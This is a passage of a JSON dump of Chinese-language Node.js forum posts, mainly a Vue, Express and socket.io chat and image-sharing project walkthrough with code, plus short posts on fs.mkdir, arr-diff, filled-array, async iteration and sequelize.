href=\"https://github.com/leinov/react-multi-page-app\">https://github.com/leinov/react-multi-page-app</a></p>\n<p>整个项目会持续维护，后期会不断的丰富menu，增加路由等，在多页中再构建单页富应用等！</p>\n</div>","title":"React多页面应用v1.3.0","last_reply_at":"2018-12-10T02:18:02.136Z","good":false,"top":false,"reply_count":0,"visit_count":668,"create_at":"2018-12-10T02:18:02.136Z","author":{"loginname":"leinov","avatar_url":"https://avatars3.githubusercontent.com/u/6204210?v=4&s=120"}},{"id":"5bfeb07ad6104a4f803a28f4","author_id":"5bfa5d31be1b120abac5c973","tab":"share","content":"<div class=\"markdown-text\"><h1>VueSocial</h1>\n<p><a href=\"http://47.107.66.252:3001/public/dist/#/home\">VueSocial</a> something like QQ、weibo、weixin（仿微博、微信的聊天社交平台）前后端分离的vue+express+socket.io练手项目 前端代码在BlogPhone下，后端代码在server下。如果你觉得这个项目还不错的话，你的star是对我最好的鼓励。</p>\n<hr>\n<h2>预览</h2>\n<p>在线demo <a href=\"http://47.107.66.252:3001/public/dist/#/home\">http://47.107.66.252:3001/public/dist/#/home</a> （pc端按了f12后有个小问题，刷新一下就好,resize触发的问题，待改进）\n<a href=\"https://github.com/CBDxin/VueSocial\">github地址</a></p>\n<h3>首页</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/13434832-a93efd387d8f785d.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/450\" alt=\"微信图片_20181118231148.jpg\"></p>\n<h3>消息</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/13434832-3c16c582cabf0c64.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/450\" alt=\"微信图片_20181118231142.jpg\"></p>\n<h3>聊天</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/13434832-d2c80908073ce036.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/450\" alt=\"微信图片_20181118231154.jpg\"></p>\n<h3>个人主页</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/13434832-c413e3834c8571df.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/450\" alt=\"微信图片_20181118231131.jpg\"></p>\n<h3>分享动态</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/13434832-2498e542f5e05bff.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/450\" alt=\"微信图片_20181118231054.jpg\"></p>\n<h3>更改头像</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/13434832-13cf4c7903c02766.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/450\" alt=\"微信图片_20181118231115.jpg\"></p>\n<h3>搜索页面</h3>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/13434832-fd5d44764b4645d1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/450\" alt=\"微信图片_20181118231126.jpg\">\n<img src=\"https://upload-images.jianshu.io/upload_images/13434832-13be4267587d68f4.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/450\" alt=\"微信图片_20181118231137.jpg\"></p>\n<hr>\n<h2>技术栈</h2>\n<ol>\n<li>vue：前端框架</li>\n<li>express：后端框架</li>\n<li><a href=\"http://socket.io\">socket.io</a>：实现实时消息推送</li>\n<li>axios：一个基于 Promise 的 HTTP 库，发送ajax请求</li>\n<li>localStorage：浏览器本地存储</li>\n<li>Webpack：模块打包工具，前端项目构建工具</li>\n<li>mongoose：mongodb的框架</li>\n<li>better-scroll:一款重点解决移动端(已支持 PC)各种滚动场景需求的插件</li>\n</ol>\n<hr>\n<h2>已实现功能</h2>\n<ol>\n<li>登录注册</li>\n<li>图片分享：上传本地图片到云服务器（我用的是阿里云的oss，可以根据自己的情况修改router/upload.js的代码）</li>\n<li>头像修改</li>\n<li>评论：<a href=\"http://socket.io\">socket.io</a></li>\n<li>实时消息推送</li>\n<li>查看个人主页</li>\n<li>实时聊天：<a href=\"http://socket.io\">socket.io</a></li>\n<li>首页下拉刷新：better-scroll</li>\n<li>搜索：搜索用户与动态、使用localStorage保存历史搜索记录</li>\n</ol>\n<hr>\n<h2>待改进</h2>\n<ol>\n<li>同一个用户多个设备同时登录时socket.io会出现问题，所以要限制登录？还是修改数据库结构？</li>\n<li>移动端的坑：有的浏览器会卡顿、Safari监听不到输入框按下搜索键（内心是崩溃的）</li>\n<li>resize时better-scroll的小bug</li>\n<li>没做分页请求，都是一次性请求全部数据</li>\n<li>评论。。。的名字直接用usename了。。。改名后会有问题。。。。有空在改</li>\n</ol>\n<hr>\n<h2>安装</h2>\n<p>分别两个文件目录下安装依赖npm install，在server文件夹下node app.js,在blogPhone下npm run dev，然后打开localhost：8081就可以了</p>\n<hr>\n<h2>分析总结</h2>\n<h3><a href=\"http://socket.io\">socket.io</a></h3>\n<h2>引入socket. io</h2>\n<p><strong>服务端:</strong></p>\n<pre class=\"prettyprint\"><code>\n  let serve = app.listen(3001);\n\n  const io = socketio(serve);\n\n  io.on(&#x27;connection&#x27;, socket =&gt; {\n\n    socket.on(&#x27;login&#x27;, (username) =&gt; {\n\n                console.log(username+&#x27;上线了！&#x27;);\n\n            });\n\n  }\n\n</code></pre><p><strong>客户端:</strong></p>\n<p>在index中引入</p>\n<pre class=\"prettyprint\"><code>&lt;script src=&quot;http:&#x2F;&#x2F;47.107.66.252:3001&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;\n\n    &lt;script type=&quot;text&#x2F;javascript&quot;&gt;\n\n      const socket = io.connect(&#x27;http:&#x2F;&#x2F;47.107.66.252:3001&#x27;);\n\n    &lt;&#x2F;script&gt;\n</code></pre><h2>整体思路</h2>\n<p>把需要用到的数据存放在vuex中，在app.vue的updateBySocket()函数中整体监听服务端emit的事件，根据路由信息判断数据是要做一般处理还是交给对话框页面进行处理</p>\n<h2>核心代码</h2>\n<h3>服务端（express实现）</h3>\n<pre class=\"prettyprint\"><code>        let serve = app.listen(3001);\n        const io = socketio(serve);\n        io.on(&#x27;connection&#x27;, socket =&gt; {\n            const socketId = socket.id;\n            &#x2F;&#x2F;登录时建立一个username到socketId的映射表\n            socket.on(&#x27;login&#x27;, (username) =&gt; {\n                socketHandler.saveUserSocketId(username, socketId)\n            });\n\n            socket.on(&#x27;chat&#x27;,(data) =&gt; {\n                Idtoid.findOne({\n                    username: data.to_user\n                }).then((rs) =&gt; {\n                &#x2F;&#x2F;根据用户名在映射表中找到对应的socketId\n                    io.to(rs.socketid).emit(&#x27;receiveMsg&#x27;,{\n                        from_user:data.from_user,\n                        message:data.message,\n                        time:data.time,\n                        avater:data.avater,\n                        _id:data._id\n                    })\n                })\n            })\n        })\n</code></pre><h3>app.vue</h3>\n<p><code>update_chatList</code>:更新聊天列表的mutation</p>\n<pre class=\"prettyprint\"><code>...mapMutations([\n        &#x27;update_chatList&#x27;\n      ]),\nupdateBySocket() {\n        socket.removeAllListeners();\n        socket.on(&#x27;receiveMsg&#x27;, (data) =&gt; {\n          let from_user = data.from_user;\n          &#x2F;&#x2F;如果当前页面为与from_user的对话框，则交由对话框页面处理\n          if (this.$route.query.chatwith == from_user) {\n            return;\n          }\n          this.update_chatList(data);\n        })\n      }\n</code></pre><h3>对话框页面 chat.vue</h3>\n<p><code>dataList</code>：当前对话框的聊天记录</p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;发送消息\n      sendMessage() {\n        if (!this.userInfo._id){\n          Toast(&quot;请先登录！&quot;);\n          return;\n        }\n        if (this.content == &#x27;&#x27;) {\n          return;\n        }\n        this.axios.post(&#x27;&#x2F;chat&#x2F;chatwith&#x27;, {&#x2F;&#x2F;向后端传输聊天记录\n          chatWithId: this.tUserInfo._id,\n          user_id: this.userInfo._id,\n          content: this.content\n        }).then((result) =&gt; {\n          &#x2F;&#x2F;把自己发送的内容更新到dataList中\n          this.dataList.push({\n            user_id: {&#x2F;&#x2F;这个有点乱了，这个是自己的信息\n              avater: this.userInfo.avater\n            },\n            chatWith: {\n              _id: this.chatWithId\n            },\n            addTime: Date.now(),\n            content: this.content\n          });\n          &#x2F;&#x2F;更新聊天用户的列表\n          this.update_chatList({\n            _id: this.tUserInfo._id,&#x2F;&#x2F;自己的id\n            from_user: this.chatWith,&#x2F;&#x2F;与你聊天的用户\n            message: this.content,&#x2F;&#x2F;消息内容\n            time: Date.now(),&#x2F;&#x2F;时间);\n            me: true,&#x2F;&#x2F;判别是不是自己发送的\n            avater:this.tUserInfo.avater\n          });\n          &#x2F;&#x2F;要发送给对方的数据\n          let data = {\n            from_user: this.userInfo.username,&#x2F;&#x2F;发送方\n            to_user: this.chatWith,&#x2F;&#x2F;接收方\n            message: this.content,&#x2F;&#x2F;消息内容\n            time: Date.now(), &#x2F;&#x2F;时间);\n            avater: this.userInfo.avater,\n            _id: this.userInfo._id\n          };\n          socket.emit(&#x27;chat&#x27;, data);\n          this.content = &#x27;&#x27;;\n        })\n      },\n      updateBySocket() {\n        socket.on(&#x27;receiveMsg&#x27;, (data) =&gt; {\n          &#x2F;&#x2F;判断一下是不是当前的对话框\n          if (data.from_user == this.chatWith) {\n            &#x2F;&#x2F;把收到的消息保存到聊天记录中\n            this.dataList.push({\n              chatWith: {\n                _id: this.userInfo._id\n              },\n              user_id: {&#x2F;&#x2F;自己的信息\n                avater: data.avater\n              },\n              addTime: data.addTime,\n              content: data.message\n            });\n            this.update_chatList({\n              _id: this.tUserInfo._id,\n              from_user: this.chatWith,&#x2F;&#x2F;与你聊天的用户\n              message: data.message,&#x2F;&#x2F;消息内容\n              time: data.addTime,&#x2F;&#x2F;时间);\n              me: true,&#x2F;&#x2F;判别是不是自己当前页面\n              avater:this.tUserInfo.avater\n            });\n          }\n        })\n      }\n</code></pre><h2>vuex mutation.js</h2>\n<pre class=\"prettyprint\"><code>[types.UPDATE_CHATLIST](state, data) {\n    let flag = 0;&#x2F;&#x2F;判断新的聊天是否存在于当前的列表中\n    state.chatList.forEach((item)=&gt;{\n      if (item.chatWith.username == data.from_user) {\n        flag = 1;\n        if (!data.me) {&#x2F;&#x2F;判断当前是否在对话框页面中\n          item.unread++;\n          state.unread++;\n        }\n        &#x2F;&#x2F;更新\n        item.content = data.message;\n        item.addTime = data.time;\n        &#x2F;&#x2F;按添加时间排序\n        state.chatList.sort((a, b) =&gt; {\n          return new Date(b.addTime) - new Date(a.addTime)\n        });\n        &#x2F;&#x2F;跳出循环\n        return false;\n      }\n    });\n    &#x2F;&#x2F;是新的并且不在对话框页面\n    if (!flag&amp;&amp;!data.me) {\n      &#x2F;&#x2F;添加到第一条\n      state.chatList.unshift({\n        chatWith: {\n          avater: data.avater,\n          username: data.from_user,\n          _id: data._id\n        },\n        addTime: data.time,\n        content: data.message,\n        unread: 1\n      });\n        state.unread++;\n    }else if (!flag&amp;&amp;data.me){&#x2F;&#x2F;新的并且在对话框页面，不需要增加unread\n      state.chatList.unshift({\n        chatWith: {\n          avater: data.avater,\n          username: data.from_user,\n          _id: data._id\n        },\n        addTime: data.time,\n        content: data.message,\n      });\n    }\n  }\n</code></pre><h2>总结</h2>\n<p>socket.io的简单使用其实并不难，只要掌握好以下几个函数</p>\n<p><code>socket.emit()</code>：向建立该连接的客户端发送消息</p>\n<p><code>socket.on()</code>：监听客户端发送信息</p>\n<p><code>io.to(socketid).emit()</code>：向指定客户端发送消息</p>\n<p><code>socket.broadcast.emit()</code>：向除去建立该连接的客户端的所有客户端广播</p>\n<p><code>io.sockets.emit()</code>：向所有客户端广播</p>\n<h3>vue</h3>\n<p>总结一些项目遇到的难点</p>\n<ol>\n<li>ajax在生命周期函数created发起，dom操作在生命周期函数mounted中操作，如果需要dom元素完全挂起后在操作则还需要在$nextTick中操作，例如：</li>\n</ol>\n<pre class=\"prettyprint\"><code>mounted() {\n      this.$nextTick(() =&gt; {\n        this.initImg();\n      })\n    }\n</code></pre><ol>\n<li>动态生成（例如通过v-for）的dom元素在mounted中通过ref是获取不到的，需要在生命周期函数updated中获取</li>\n<li>keepalive后的组件如果需要在跳转进入时进行操作可通过路由守卫和生命周期函数actived配合使用，如：</li>\n</ol>\n<pre class=\"prettyprint\"><code>beforeRouteEnter(to, from, next) {\n      if (from.path == &#x27;&#x2F;upload&#x27; ) {\n        next(vm =&gt; {\n          vm._getList = true\n        })\n      } else {\n        next()\n      }\n    }\n</code></pre><pre class=\"prettyprint\"><code>activated() {\n      this.$nextTick(() =&gt; {\n        if (this._getList) {\n          this.getPyqLists();\n        }\n      })\n    }\n</code></pre><h2>图片上传及预览部分</h2>\n<p>html部分主要是借助了weui的样式</p>\n<pre class=\"prettyprint\"><code>&lt;template&gt;\n  &lt;div&gt;\n    &lt;myheader :title=&quot;&#x27;发布动态&#x27;&quot;&gt;\n      &lt;i class=&quot;iconfont icon-fanhui1 left&quot; slot=&quot;left&quot; @click=&quot;goback&quot;&gt;&lt;&#x2F;i&gt;\n    &lt;&#x2F;myheader&gt;\n    &lt;div class=&quot;upload&quot;&gt;\n      &lt;div v-if=&quot;userInfo._id&quot;&gt;\n        &lt;!--图片上传--&gt;\n        &lt;div class=&quot;weui-gallery&quot; id=&quot;gallery&quot;&gt;\n          &lt;span class=&quot;weui-gallery__img&quot; id=&quot;galleryImg&quot;&gt;&lt;&#x2F;span&gt;\n          &lt;div class=&quot;weui-gallery__opr&quot;&gt;\n            &lt;a href=&quot;javascript:&quot; class=&quot;weui-gallery__del&quot;&gt;\n              &lt;i class=&quot;weui-icon-delete weui-icon_gallery-delete&quot;&gt;&lt;&#x2F;i&gt;\n            &lt;&#x2F;a&gt;\n          &lt;&#x2F;div&gt;\n        &lt;&#x2F;div&gt;\n        &lt;div class=&quot;weui-cells weui-cells_form&quot;&gt;\n          &lt;div class=&quot;weui-cell&quot;&gt;\n            &lt;div class=&quot;weui-cell__bd&quot;&gt;\n              &lt;textarea class=&quot;weui-textarea&quot; v-model=&quot;content&quot; placeholder=&quot;你想说啥&quot; rows=&quot;3&quot;&gt;&lt;&#x2F;textarea&gt;\n            &lt;&#x2F;div&gt;\n          &lt;&#x2F;div&gt;\n          &lt;div class=&quot;weui-cell&quot;&gt;\n            &lt;div class=&quot;weui-cell__bd&quot;&gt;\n              &lt;div class=&quot;weui-uploader&quot;&gt;\n                &lt;div class=&quot;weui-uploader__bd&quot;&gt;\n                  &lt;ul class=&quot;weui-uploader__files&quot; id=&quot;uploaderFiles&quot;&gt;\n                    &lt;li ref=&quot;files&quot; class=&quot;weui-uploader__file&quot; v-for=&quot;(image,index) in images&quot; :key=&quot;index&quot;\n                        :style=&quot;&#x27;backgroundImage:url(&#x27; + image +&#x27; )&#x27;&quot;&gt;&lt;span @click=&quot;deleteimg(index)&quot; class=&quot;x&quot;&gt;&amp;times;&lt;&#x2F;span&gt;&lt;&#x2F;li&gt;\n                  &lt;&#x2F;ul&gt;\n                  &lt;div v-show=&quot;images.length &lt; maxCount&quot; class=&quot;weui-uploader__input-box&quot;&gt;\n                    &lt;input @change=&quot;change&quot; id=&quot;uploaderInput&quot; class=&quot;weui-uploader__input &quot; type=&quot;file&quot;\n                          multiple accept=&quot;image&#x2F;*&quot;&gt;\n                  &lt;&#x2F;div&gt;\n                &lt;&#x2F;div&gt;\n              &lt;&#x2F;div&gt;\n            &lt;&#x2F;div&gt;\n          &lt;&#x2F;div&gt;\n        &lt;&#x2F;div&gt;\n        &lt;a class=&quot;weui-btn weui-btn_primary btn-put&quot; style=&quot;margin: 20px &quot; @click.prevent.once=&quot;put&quot;&gt;发送&lt;&#x2F;a&gt;\n      &lt;&#x2F;div&gt;\n      &lt;unlogin v-else&gt; &lt;&#x2F;unlogin&gt;\n    &lt;&#x2F;div&gt;\n  &lt;&#x2F;div&gt;\n&lt;&#x2F;template&gt;\n\n</code></pre><p>重点部分在于</p>\n<pre class=\"prettyprint\"><code>&lt;ul class=&quot;weui-uploader__files&quot; id=&quot;uploaderFiles&quot;&gt;\n  &lt;li ref=&quot;files&quot; class=&quot;weui-uploader__file&quot; v-for=&quot;(image,index) in images&quot; :key=&quot;index&quot;\n      :style=&quot;&#x27;backgroundImage:url(&#x27; + image +&#x27; )&#x27;&quot;&gt;&lt;span @click=&quot;deleteimg(index)&quot; class=&quot;x&quot;&gt;&amp;times;&lt;&#x2F;span&gt;&lt;&#x2F;li&gt;\n&lt;&#x2F;ul&gt;\n&lt;div v-show=&quot;!this.$refs.files||this.$refs.files.length &lt; maxCount&quot; class=&quot;weui-uploader__input-box&quot;&gt;\n  &lt;input @change=&quot;change&quot; id=&quot;uploaderInput&quot; class=&quot;weui-uploader__input&quot; type=&quot;file&quot;\n         multiple accept=&quot;image&#x2F;*&quot;&gt;\n&lt;&#x2F;div&gt;\n</code></pre><p>通过<code>@change=&quot;change&quot;</code>监听图片的上传，把图片转成base64后（后面会讲怎么转base64）将base64的地址加入到images数组，通过<code>v-for=&quot;(image,index) in images&quot;</code>把要上传的图片在页面中显示出来，即达到了预览的效果</p>\n<p>js部分\ndata部分</p>\n<pre class=\"prettyprint\"><code>data() {\n      return {\n        content: &#x27;&#x27;,&#x2F;&#x2F;分享动态的文字内容\n        maxSize: 10240000 &#x2F; 2,&#x2F;&#x2F;图片的最大大小\n        maxCount: 8,&#x2F;&#x2F;最大数量\n        filesArr: [],&#x2F;&#x2F;保存要上传图片的数组\n        images: []&#x2F;&#x2F;转成base64后的图片的数组\n      }\n    }\n</code></pre><p>delete方法</p>\n<pre class=\"prettyprint\"><code>deleteimg(index) {\n        this.filesArr.splice(index, 1);\n        this.images.splice(index, 1);\n      }\n</code></pre><p>change方法</p>\n<pre class=\"prettyprint\"><code>change(e) {\n        let files = e.target.files;\n        &#x2F;&#x2F; 如果没有选中文件，直接返回\n        if (files.length === 0) {\n          return;\n        }\n        if (this.images.length + files.length &gt; this.maxCount) {\n          Toast(&#x27;最多只能上传&#x27; + this.maxCount + &#x27;张图片！&#x27;);\n          return;\n        }\n        let reader;\n        let file;\n        let images = this.images;\n        for (let i = 0; i &lt; files.length; i++) {\n          file = files[i];\n          this.filesArr.push(file);\n          reader = new FileReader();\n          if (file.size &gt; self.maxSize) {\n            Toast(&#x27;图片太大，不允许上传！&#x27;);\n            continue;\n          }\n          reader.onload = (e) =&gt; {\n            let img = new Image();\n            img.onload = function () {\n              let canvas = document.createElement(&#x27;canvas&#x27;);\n              let ctx = canvas.getContext(&#x27;2d&#x27;);\n              let w = img.width;\n              let h = img.height;\n              &#x2F;&#x2F; 设置 canvas 的宽度和高度\n              canvas.width = w;\n              canvas.height = h;\n              ctx.drawImage(img, 0, 0, w, h);\n              let base64 = canvas.toDataURL(&#x27;image&#x2F;png&#x27;);\n              images.push(base64);\n            };\n            img.src = e.target.result;\n          };\n          reader.readAsDataURL(file);\n        }\n      }\n</code></pre><p>put方法把filesArr中保存的图片通过axios发送到后端,注意要设置headers信息</p>\n<pre class=\"prettyprint\"><code>put() {\n        Indicator.open(&#x27;发布中...&#x27;);\n        let self = this;\n        let content = this.content;\n        let param = new FormData();\n        param.append(&#x27;content&#x27;, content);\n        param.append(&#x27;username&#x27;, this.userInfo._id);\n        this.filesArr.forEach((file) =&gt; {\n          param.append(&#x27;file2&#x27;, file);\n        });\n        self.axios.post(&#x27;&#x2F;upload&#x2F;uploadFile&#x27;, param, {\n          headers: {\n            &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;\n          }\n        }).then(function (result) {\n          console.log(result.data);\n          self.$router.push({path: &#x27;&#x2F;home&#x27;});\n          Indicator.close();\n          Toast(result.data.msg)\n        })\n      }\n</code></pre><p>后端通过multer模块保存传输的图片，再把保存下来的图片发送到阿里云oss（这个可以根据自己的使用情况变化）</p>\n<pre class=\"prettyprint\"><code>let filePath;\nlet fileName;\n\nlet Storage = multer.diskStorage({\n    destination: function (req, file, cb) {&#x2F;&#x2F;计算图片存放地址\n        cb(null, &#x27;.&#x2F;public&#x2F;img&#x27;);\n    },\n    filename: function (req, file, cb) {&#x2F;&#x2F;图片文件名\n        fileName = Date.now() + &#x27;_&#x27; + parseInt(Math.random() * 1000000) + &#x27;.png&#x27;;\n        filePath = &#x27;.&#x2F;public&#x2F;img&#x2F;&#x27; + fileName;\n        cb(null, fileName)\n    }\n});\nlet upload = multer({storage: Storage}).any();&#x2F;&#x2F;file2表示图片上传文件的key\n\nrouter.post(&#x27;&#x2F;uploadFile&#x27;, function (req, res, next) {\n    upload(req, res, function (err) {\n        let content = req.body.content || &#x27;&#x27;;\n        let username = req.body.username;\n        let imgs = [];&#x2F;&#x2F;要保存到数据库的图片地址数组\n        if (err) {\n            return res.end(err);\n        }\n        if (req.files.length === 0) {\n            new Pyq({\n                writer: username,\n                content: content\n            }).save().then((result) =&gt; {\n                res.json({\n                    result: result,\n                    code: &#x27;0&#x27;,\n                    msg: &#x27;上传成功&#x27;\n                });\n            })\n        }\n        let i = 0;\n        req.files.forEach((item, index) =&gt; {\n            let filePath = &#96;.&#x2F;public&#x2F;img&#x2F;${item.filename}&#96;;\n            put(item.filename,filePath,(result)=&gt;{\n                imgs.push(result.url);\n                i++;\n                if (i === req.files.length) {\n                &#x2F;&#x2F;forEach循环是同步的，但上传图片是异步的，所以用一个i去标记图片是否全部上传成功\n                &#x2F;&#x2F;这时才把数据保存到数据库\n                    new Pyq({\n                        content: content,\n                        writer: username,\n                        pimg: imgs\n                    }).save().then(() =&gt; {\n                        res.json({\n                            code: &#x27;0&#x27;,\n                            msg: &#x27;发布成功&#x27;\n                        });\n                    })\n                }\n            })\n        })\n    })\n});\n</code></pre><hr>\n<h1>如果觉得这个项目对你有帮助，请留下你的star，谢谢(＾－＾)</h1>\n</div>","title":"express+vue+socket.io实现可实时聊天、分享图片的社交平台","last_reply_at":"2018-12-10T01:57:09.196Z","good":false,"top":false,"reply_count":6,"visit_count":1637,"create_at":"2018-11-28T15:12:58.581Z","author":{"loginname":"CBDxin","avatar_url":"https://avatars1.githubusercontent.com/u/42411100?v=4&s=120"}},{"id":"5c0b4fba15a4d545e3f4c6a5","author_id":"53b25565399ed9e07d1e8793","tab":"ask","content":"<div class=\"markdown-text\"><p>看了下nodejs的api，有个参数 <code>recursive</code> 翻译了一下，是递归的意思，估计是设置为true，就可以创建多级目录了，如下</p>\n<p><a href=\"https://nodejs.org/api/fs.html#fs_fs_mkdir_path_options_callback\">https://nodejs.org/api/fs.html#fs_fs_mkdir_path_options_callback</a></p>\n<pre class=\"prettyprint language-js\"><code>fs.mkdir(path[, options], callback)\noptions &lt;Object&gt; | &lt;integer&gt;\nrecursive &lt;boolean&gt; Default: false\nmode &lt;integer&gt; Not supported on Windows. Default: 0o777.\n</code></pre><p>然后我就试了一下，结果是有时候可以创建成功，有时候创建不成功，我的代码是 <code>fs.mkdirSync(path, {recursive: true})</code></p>\n<p>最可气的是，我本机测试好好的，传到服务器上就坏了，最后还是用的一个开源库解决了问题 <code>mkdirp</code></p>\n<p>有人用过这个参数吗？求解释。。</p>\n</div>","title":"nodejs 创建多级目录问题","last_reply_at":"2018-12-10T01:33:46.685Z","good":false,"top":false,"reply_count":4,"visit_count":770,"create_at":"2018-12-08T04:59:38.977Z","author":{"loginname":"tomoya92","avatar_url":"https://avatars2.githubusercontent.com/u/6915570?v=4&s=120"}},{"id":"5c0cad807ec239239ff54f35","author_id":"57067a058265278d59c7e61f","tab":"share","content":"<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/jonschlinkert/arr-diff\">https://github.com/jonschlinkert/arr-diff</a></p>\n<h2>2、作用</h2>\n<p>计算所给数组与其他数组不同的元素，并生成一个新数组</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const diff = require(&#x27;arr-diff&#x27;);\n\nlet arrayOne = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;];\nlet arrayTwo = [&#x27;b&#x27;, &#x27;d&#x27;];\nconsole.log(diff(arrayOne, arrayTwo)) &#x2F;&#x2F; 输出：[&#x27;a&#x27;, &#x27;c&#x27;]\n\nlet arrayThree = [&#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;];\nlet arrayFour = [&#x27;i&#x27;, &#x27;e&#x27;];\nlet arrayFive = [&#x27;g&#x27;, &#x27;e&#x27;];\nconsole.log(diff(arrayThree, arrayFour, arrayFive)) &#x2F;&#x2F; 输出：[&#x27;f&#x27;, &#x27;h&#x27;]\n</code></pre><h3>3.2 源码及解析</h3>\n<pre class=\"prettyprint language-javascript\"><code>function diff(arr) {\n var len = arguments.length; &#x2F;&#x2F; 充分利用了arguments，即使diff只有一个参数名，但是可以传多个参数数组, 这样可以让多个数组进行比较\n\n var idx = 0;\n while (++idx &lt; len) {\n   arr = diffArray(arr, arguments[idx]); &#x2F;&#x2F; 拿第一个数组与其他数组进行比较。比较的结果再与其他数组比较\n }\n return arr;\n};\n\nfunction diffArray(one, two) {\n if (!Array.isArray(two)) { &#x2F;&#x2F; 如何two不是数组，就浅拷贝并返回\n   return one.slice();\n }\n\n var tlen = two.length;\n var olen = one.length;\n var idx = -1;\n var arr = [];\n\n while (++idx &lt; olen) { &#x2F;&#x2F; 遍历第一个数组\n   var ele = one[idx];\n\n   var hasEle = false;\n   for (var i = 0; i &lt; tlen; i++) { &#x2F;&#x2F; 拿第一个数组的元素与第二个数组的每个元素进行比较\n     var val = two[i];\n\n     if (ele === val) { &#x2F;&#x2F; 如果第二个数组存在该元素，就停止遍历\n       hasEle = true;\n       break;\n     }\n   }\n\n   if (hasEle === false) {\n     arr.push(ele);\n   }\n }\n return arr;\n}\n</code></pre></div>","title":"npm模块学习之arr-diff","last_reply_at":"2018-12-09T12:56:14.136Z","good":false,"top":false,"reply_count":1,"visit_count":605,"create_at":"2018-12-09T05:52:00.308Z","author":{"loginname":"sunfeng90","avatar_url":"https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"}},{"id":"5c0d02aff3d48d2397c0f66e","author_id":"5a9a256b2ffb8598445aeabb","tab":"share","content":"<div class=\"markdown-text\"><p>对于Array来说,里面自带的forEach,filter,map等方法给我们带来了很多便利,但如果子语句中有异步操作,要怎么使用呢?直接在加async await?万万不可, 这里面还是有坑的,详细的原因如下: <a href=\"https://www.jianshu.com/p/dbbd79e43c02\">https://www.jianshu.com/p/dbbd79e43c02</a></p>\n</div>","title":"JavaScript中Array的forEach,Filter和async结合使用的坑","last_reply_at":"2018-12-09T11:55:27.199Z","good":false,"top":false,"reply_count":0,"visit_count":572,"create_at":"2018-12-09T11:55:27.199Z","author":{"loginname":"keith666666","avatar_url":"https://avatars1.githubusercontent.com/u/14068334?v=4&s=120"}},{"id":"5c0cfa21f3d48d2397c0f607","author_id":"57b08034a4f7e29c763413ef","tab":"ask","content":"<div class=\"markdown-text\"><p>以下是对两个函数的执行性能压测结果，functionA 的代码可读性更高，但是性能差距functonB 23倍，但是都达到看百万ops/sec,因此想这种对于这种百万级别的ops/sec,相差的效率影响有多大？</p>\n<pre class=\"prettyprint\"><code>functonA x 3,236,388 ops&#x2F;sec ±1.14% (83 runs sampled)\nfunctonB x 75,850,967 ops&#x2F;sec ±1.49% (87 runs sampled)\n</code></pre><p>因为平均下来，每次执行时间差距不到us级别，因此是不是可以忽略这中间的差距</p>\n</div>","title":"两个函数，ops/sec  百万级别和千万级别两种， 这种性能差距，在高并发产场景有很明显的区别吗？","last_reply_at":"2018-12-09T11:18:57.140Z","good":false,"top":false,"reply_count":0,"visit_count":679,"create_at":"2018-12-09T11:18:57.140Z","author":{"loginname":"lvgithub","avatar_url":"https://avatars1.githubusercontent.com/u/16065346?v=4&s=120"}},{"id":"5a31e43d9807389a1809f39c","author_id":"57aaad434653749872ec6f6b","tab":"ask","content":"<div class=\"markdown-text\"><p>请问一下，使用sequelize来操作数据库，但是项目进行到后期肯定会有字段的新增，那么这个时候一般都是怎么操作的呢，是自己手动去数据库新增，然后修改sequelize定义的模型么，还是有其他的方法</p>\n</div>","title":"使用sequelize操作数据库，后期如何新增字段问题","last_reply_at":"2018-12-09T10:40:09.244Z","good":false,"top":false,"reply_count":16,"visit_count":6563,"create_at":"2017-12-14T02:38:53.107Z","author":{"loginname":"xumjs8623","avatar_url":"https://avatars0.githubusercontent.com/u/12467615?v=4&s=120"}},{"id":"5c0cbd5ff3d48d2397c0f56a","author_id":"57067a058265278d59c7e61f","tab":"ask","content":"<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/sindresorhus/filled-array.git\">https://github.com/sindresorhus/filled-array.git</a></p>\n<h2>2、作用</h2>\n<p>生成指定大小并充满指定元素的数组</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const filledArray = require(&#x27;filled-array&#x27;);\n\nconsole.log(filledArray(&#x27;www&#x27;, 3)) &#x2F;&#x2F; 输出： [&#x27;www&#x27;, &#x27;www&#x27;, &#x27;www&#x27;]\nconsole.log(filledArray(&#x27;www&#x27;, -2)) &#x2F;&#x2F; 输出数组长度非法的异常\nconsole.log(filledArray(&#x27;www&#x27;, 0)) &#x2F;&#x2F; 输出：[]\nconsole.log(filled(i =&gt; {return i}, 15)); &#x2F;&#x2F; 输出：[ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 ]\n</code></pre><h3>3.2 源码及解析</h3>\n<pre class=\"prettyprint language-javascript\"><code>function filled(item, n) {\n  var ret = new Array(n);\n  var isFn = typeof item === &#x27;function&#x27;;\n\n if (!isFn &amp;&amp; typeof ret.fill === &#x27;function&#x27;) {  &#x2F;&#x2F; 如果item不是数组，生成长度为n，且填充item的数组\n    return ret.fill(item);\n  }\n\n for (var i = 0; i &lt; n; i++) {\n    ret[i] = isFn ? item(i, n, ret) : 